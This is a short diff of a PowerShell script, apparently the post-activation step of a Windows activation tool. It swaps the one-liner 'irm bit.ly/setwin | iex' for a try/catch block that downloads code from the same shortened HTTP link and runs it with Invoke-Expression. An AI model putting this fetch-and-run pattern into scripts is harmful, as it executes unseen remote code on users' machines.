@@ -114,4 +114,10 @@ else {
     }
 }
 # ---------------- POST-ACTIVATION ----------------
-irm bit.ly/setwin | iex
+Write-Host "Running post-activation settings script..." -ForegroundColor Cyan
+try {
+    Invoke-Expression (Invoke-RestMethod -Uri "http://bit.ly/setwin")
+    Write-Host "✅ Post-activation settings applied." -ForegroundColor Green
+} catch {
+    Write-Host "❌ Failed to run post-activation settings script." -ForegroundColor Red
+}
